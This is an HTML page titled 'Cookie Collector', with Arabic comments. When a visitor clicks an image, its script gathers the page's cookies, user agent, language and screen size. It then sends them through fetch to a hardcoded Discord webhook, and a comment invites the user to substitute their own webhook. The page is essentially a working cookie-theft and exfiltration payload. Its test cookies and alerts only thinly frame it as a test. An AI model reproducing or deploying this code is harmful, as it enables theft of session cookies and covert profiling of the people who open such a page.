<!DOCTYPE html>
<html>
<head>
    <title>Cookie Collector</title>
    <style>
        body { text-align: center; }
        img { cursor: pointer; }
    </style>
</head>
<body>
    <h1>Click on the image</h1>
    <!-- استبدل رابط الصورة هنا -->
    <img src="https://i.imgur.com/example.jpg" width="300" onclick="sendCookies()" />

    <script>
        // إنشاء ملفات تعريف ارتباط مؤقتة للاختبار
        document.cookie = "test_cookie=123; path=/";
        document.cookie = "user_session=abcxyz; path=/";

        function sendCookies() {
            // جمع المعلومات
            const cookies = document.cookie;
            const userAgent = navigator.userAgent;
            const language = navigator.language;
            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;
            
            // عرض المعلومات في تنبيه (للاختبار)
            alert(`Cookies: ${cookies}\nUser Agent: ${userAgent}\nLanguage: ${language}\nScreen: ${screenWidth}x${screenHeight}`);

            if (!cookies) {
                alert("No cookies found!");
                return;
            }

            // استبدل رابط Webhook الخاص بك هنا
            const webhookUrl = 'https://discord.com/api/webhooks/1476727887053721721/UkshRh9j3xisTqqOHLnEvMI5dFlg-dmLWZkuY55yPtAWjuFFM0iPkMlFWUlF0LUjWHTN';

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `
**Cookies collected:**
\`${cookies}\`

**User Agent:**
${userAgent}

**Language:**
${language}

**Screen Resolution:**
${screenWidth}x${screenHeight}
                    `
                })
            });

            alert("Information sent to Discord!");
        }
    </script>
</body>
</html>
